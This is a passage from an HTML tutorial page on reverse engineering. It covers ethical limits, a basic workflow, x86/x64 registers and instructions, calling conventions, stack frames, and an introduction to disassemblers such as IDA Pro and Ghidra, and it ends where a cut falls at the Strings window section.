<li class="">❌ Circumventing software licensing for piracy</li>
<li class="">❌ Developing exploits for malicious purposes</li>
<li class="">❌ Violating terms of service without authorization</li>
</ul>
<p><strong>Best practices:</strong></p>
<ul>
<li class="">Obtain authorization before reversing proprietary software</li>
<li class="">Use isolated lab environments (VMs, air-gapped systems)</li>
<li class="">Follow responsible disclosure for vulnerabilities</li>
<li class="">Respect intellectual property rights</li>
<li class="">Document legal basis for reverse engineering activities</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="reverse-engineering-methodology">Reverse Engineering Methodology<a href="#reverse-engineering-methodology" class="hash-link" aria-label="Direct link to Reverse Engineering Methodology" title="Direct link to Reverse Engineering Methodology" translate="no">​</a></h3>
<p><strong>Standard workflow:</strong></p>
<!-- -->
<p><strong>Step-by-step:</strong></p>
<ol>
<li class=""><strong>Triage:</strong> Identify file type, architecture, protections</li>
<li class=""><strong>Static analysis:</strong> Disassemble, decompile, analyze strings/imports</li>
<li class=""><strong>Dynamic analysis:</strong> Debug, trace execution, monitor behavior</li>
<li class=""><strong>Iterative refinement:</strong> Alternate between static/dynamic until goal achieved</li>
<li class=""><strong>Documentation:</strong> Document findings, create exploits or reports</li>
</ol>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="reverse-engineering-fundamentals">Reverse Engineering Fundamentals<a href="#reverse-engineering-fundamentals" class="hash-link" aria-label="Direct link to Reverse Engineering Fundamentals" title="Direct link to Reverse Engineering Fundamentals" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="assembly-language-basics">Assembly Language Basics<a href="#assembly-language-basics" class="hash-link" aria-label="Direct link to Assembly Language Basics" title="Direct link to Assembly Language Basics" translate="no">​</a></h3>
<p><strong>Why assembly matters:</strong></p>
<ul>
<li class="">Compiled binaries are machine code (assembly is human-readable representation)</li>
<li class="">Understanding assembly is essential for reversing (no source code available)</li>
<li class="">Different architectures have different instruction sets (x86, ARM, MIPS)</li>
</ul>
<p><strong>Common architectures:</strong></p>
<table><thead><tr><th>Architecture</th><th>Bit Width</th><th>Common Use</th><th>Examples</th></tr></thead><tbody><tr><td><strong>x86</strong></td><td>32-bit</td><td>Legacy Windows, Linux</td><td>EXE, ELF (32-bit)</td></tr><tr><td><strong>x64 (x86-64)</strong></td><td>64-bit</td><td>Modern Windows, Linux, macOS</td><td>EXE, ELF, Mach-O (64-bit)</td></tr><tr><td><strong>ARM</strong></td><td>32/64-bit</td><td>Mobile devices, IoT, Apple Silicon</td><td>Android, iOS, embedded systems</td></tr><tr><td><strong>MIPS</strong></td><td>32/64-bit</td><td>Routers, embedded systems</td><td>Firmware</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="x86x64-assembly-fundamentals">x86/x64 Assembly Fundamentals<a href="#x86x64-assembly-fundamentals" class="hash-link" aria-label="Direct link to x86/x64 Assembly Fundamentals" title="Direct link to x86/x64 Assembly Fundamentals" translate="no">​</a></h3>
<p><strong>Registers (x86 32-bit):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; General-purpose registers:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EAX - Accumulator (arithmetic, return values)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EBX - Base (pointer to data)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ECX - Counter (loop counters)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EDX - Data (I/O, arithmetic)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Pointer registers:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ESP - Stack Pointer (top of stack)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EBP - Base Pointer (stack frame base)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ESI - Source Index (string/memory operations)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EDI - Destination Index (string/memory operations)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Instruction pointer:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EIP - Instruction Pointer (next instruction address)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Flags register:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EFLAGS - Flags (Zero Flag, Carry Flag, Sign Flag, etc.)</span><br></span></code></pre></div></div>
<p><strong>Registers (x64 64-bit):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; x64 extends 32-bit registers to 64-bit:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RAX, RBX, RCX, RDX, RSI, RDI, RSP, RBP, RIP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Additional registers (r8-r15):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R8, R9, R10, R11, R12, R13, R14, R15</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Lower 32-bit access:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EAX (lower 32 bits of RAX)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R8D (lower 32 bits of R8)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Lower 16-bit access:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AX (lower 16 bits of RAX)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R8W (lower 16 bits of R8)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Lower 8-bit access:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AL (lower 8 bits of RAX)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">R8B (lower 8 bits of R8)</span><br></span></code></pre></div></div>
<p><strong>Common instructions:</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Data movement:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov eax, 0x42          ; Move value 0x42 into EAX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea eax, [ebp-0x10]    ; Load effective address (pointer arithmetic)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push eax               ; Push EAX onto stack, decrement ESP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop eax                ; Pop top of stack into EAX, increment ESP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Arithmetic:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add eax, ebx           ; EAX = EAX + EBX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub eax, 0x10          ; EAX = EAX - 0x10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">inc eax                ; EAX = EAX + 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dec eax                ; EAX = EAX - 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mul ebx                ; EAX = EAX * EBX (unsigned)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">imul ebx               ; EAX = EAX * EBX (signed)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">div ebx                ; EAX = EAX / EBX, EDX = remainder</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Logical operations:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">and eax, 0xFF          ; Bitwise AND (mask lower 8 bits)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or eax, ebx            ; Bitwise OR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor eax, eax           ; XOR (common idiom to zero register: EAX = 0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">not eax                ; Bitwise NOT (invert all bits)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shl eax, 2             ; Shift left (multiply by 4)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shr eax, 2             ; Shift right (divide by 4)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Control flow:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmp eax, ebx           ; Compare EAX and EBX (sets flags)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test eax, eax          ; Bitwise AND, set flags (check if zero)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jmp 0x401000           ; Unconditional jump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">je 0x401000            ; Jump if equal (ZF=1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jne 0x401000           ; Jump if not equal (ZF=0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jg 0x401000            ; Jump if greater (signed)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jl 0x401000            ; Jump if less (signed)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ja 0x401000            ; Jump if above (unsigned)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jb 0x401000            ; Jump if below (unsigned)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call 0x401000          ; Call function (push return address, jump)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret                    ; Return from function (pop return address, jump)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; String operations:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rep movsb              ; Repeat: move byte from ESI to EDI, decrement ECX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rep stosb              ; Repeat: store AL at EDI, decrement ECX</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="calling-conventions">Calling Conventions<a href="#calling-conventions" class="hash-link" aria-label="Direct link to Calling Conventions" title="Direct link to Calling Conventions" translate="no">​</a></h3>
<p><strong>Calling conventions</strong> define how functions receive arguments and return values.</p>
<p><strong>Windows x86 (32-bit):</strong></p>
<p><strong>stdcall (WinAPI standard):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Arguments pushed right-to-left onto stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Callee cleans up stack (ret 0xN)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Example: MessageBoxA(NULL, &quot;Hello&quot;, &quot;Title&quot;, MB_OK)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push 0                 ; MB_OK (arg 4)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push offset aTitle     ; &quot;Title&quot; (arg 3)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push offset aHello     ; &quot;Hello&quot; (arg 2)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push 0                 ; NULL (arg 1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call MessageBoxA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Callee (MessageBoxA) cleans stack with &quot;ret 0x10&quot;</span><br></span></code></pre></div></div>
<p><strong>cdecl (C standard):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Arguments pushed right-to-left onto stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Caller cleans up stack (add esp, 0xN)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Example: printf(&quot;Value: %d&quot;, 42)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push 42                ; arg 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push offset aFormat    ; &quot;Value: %d&quot; (arg 1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call printf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add esp, 0x8           ; Caller cleans stack (2 args * 4 bytes)</span><br></span></code></pre></div></div>
<p><strong>fastcall:</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; First 2 arguments in ECX, EDX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Remaining arguments on stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Example: fastcall_func(1, 2, 3, 4)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push 4                 ; arg 4 (stack)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push 3                 ; arg 3 (stack)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov edx, 2             ; arg 2 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov ecx, 1             ; arg 1 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call fastcall_func</span><br></span></code></pre></div></div>
<p><strong>Windows x64:</strong></p>
<p><strong>Microsoft x64 calling convention:</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; First 4 arguments in registers: RCX, RDX, R8, R9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Remaining arguments on stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Caller allocates 32-byte &quot;shadow space&quot; on stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Caller cleans stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Example: func(1, 2, 3, 4, 5, 6)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub rsp, 0x28          ; Allocate shadow space (32 bytes) + align</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov qword [rsp+0x28], 6  ; arg 6 (stack)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov qword [rsp+0x20], 5  ; arg 5 (stack)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r9, 4              ; arg 4 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r8, 3              ; arg 3 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx, 2             ; arg 2 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rcx, 1             ; arg 1 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call func</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add rsp, 0x28          ; Clean up</span><br></span></code></pre></div></div>
<p><strong>Linux x64 (System V AMD64 ABI):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; First 6 arguments in registers: RDI, RSI, RDX, RCX, R8, R9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Remaining arguments on stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Return value in RAX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Example: func(1, 2, 3, 4, 5, 6, 7)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push 7                 ; arg 7 (stack)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r9, 6              ; arg 6 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r8, 5              ; arg 5 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rcx, 4             ; arg 4 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx, 3             ; arg 3 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rsi, 2             ; arg 2 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi, 1             ; arg 1 (register)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call func</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add rsp, 0x8           ; Clean up</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="stack-frames">Stack Frames<a href="#stack-frames" class="hash-link" aria-label="Direct link to Stack Frames" title="Direct link to Stack Frames" translate="no">​</a></h3>
<p><strong>Function prologue (setup stack frame):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">push ebp               ; Save old base pointer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov ebp, esp           ; Set new base pointer (current stack top)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub esp, 0x20          ; Allocate 32 bytes for local variables</span><br></span></code></pre></div></div>
<p><strong>Stack layout:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">High memory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Return address]   &lt;-- Pushed by CALL instruction</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Saved EBP]        &lt;-- EBP points here</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Local var 1]      &lt;-- EBP-0x4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Local var 2]      &lt;-- EBP-0x8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Local var 3]      &lt;-- EBP-0xC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...                &lt;-- ESP points here (top of stack)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Low memory</span><br></span></code></pre></div></div>
<p><strong>Function epilogue (cleanup stack frame):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mov esp, ebp           ; Restore stack pointer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop ebp                ; Restore old base pointer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret                    ; Return to caller (pop return address, jump)</span><br></span></code></pre></div></div>
<p><strong>Accessing arguments and local variables:</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Arguments (above EBP):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov eax, [ebp+0x8]     ; First argument (after return address)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov ebx, [ebp+0xC]     ; Second argument</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Local variables (below EBP):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov [ebp-0x4], eax     ; Store EAX in local var 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov ecx, [ebp-0x8]     ; Load local var 2 into ECX</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="static-analysis">Static Analysis<a href="#static-analysis" class="hash-link" aria-label="Direct link to Static Analysis" title="Direct link to Static Analysis" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="disassemblers--decompilers">Disassemblers &amp; Decompilers<a href="#disassemblers--decompilers" class="hash-link" aria-label="Direct link to Disassemblers &amp; Decompilers" title="Direct link to Disassemblers &amp; Decompilers" translate="no">​</a></h3>
<p><strong>Static analysis</strong> examines the binary without executing it.</p>
<p><strong>Popular tools:</strong></p>
<table><thead><tr><th>Tool</th><th>Type</th><th>Platform</th><th>Strengths</th><th>Cost</th></tr></thead><tbody><tr><td><strong>IDA Pro</strong></td><td>Disassembler/Decompiler</td><td>Windows, Linux, macOS</td><td>Industry standard, Hex-Rays decompiler, scripting (IDAPython)</td><td>Commercial ($$$)</td></tr><tr><td><strong>Ghidra</strong></td><td>Disassembler/Decompiler</td><td>Windows, Linux, macOS</td><td>Free, NSA-developed, excellent decompiler, Java/Python scripting</td><td>Free</td></tr><tr><td><strong>Binary Ninja</strong></td><td>Disassembler/Decompiler</td><td>Windows, Linux, macOS</td><td>Modern UI, BNIL (intermediate language), Python API</td><td>Commercial ($$)</td></tr><tr><td><strong>Radare2</strong></td><td>Disassembler</td><td>Windows, Linux, macOS</td><td>CLI-based, scriptable, FLIRT signatures</td><td>Free</td></tr><tr><td><strong>Hopper</strong></td><td>Disassembler/Decompiler</td><td>macOS, Linux</td><td>macOS/iOS focus, ARM support</td><td>Commercial ($)</td></tr><tr><td><strong>Cutter</strong></td><td>Disassembler</td><td>Windows, Linux, macOS</td><td>GUI for Radare2</td><td>Free</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ida-pro-basics">IDA Pro Basics<a href="#ida-pro-basics" class="hash-link" aria-label="Direct link to IDA Pro Basics" title="Direct link to IDA Pro Basics" translate="no">​</a></h3>
<p><strong>Loading a binary:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Launch IDA Pro (Windows):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ida64.exe malware.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Linux:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./ida64 malware.elf</span><br></span></code></pre></div></div>
<p><strong>Key IDA features:</strong></p>
<p><strong>1. Disassembly view:</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.text:00401000 55                    push    ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00401001 8B EC                 mov     ebp, esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00401003 83 EC 20              sub     esp, 20h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00401006 C7 45 FC 00 00 00 00  mov     dword ptr [ebp-4], 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0040100D EB 09                 jmp     short loc_401018</span><br></span></code></pre></div></div>
<p><strong>2. Hex-Rays decompiler (F5):</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> __cdecl </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> counter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">counter </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Counter: %d\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> counter</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        counter</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><strong>3. Strings window (Shift+F12):</strong></p>
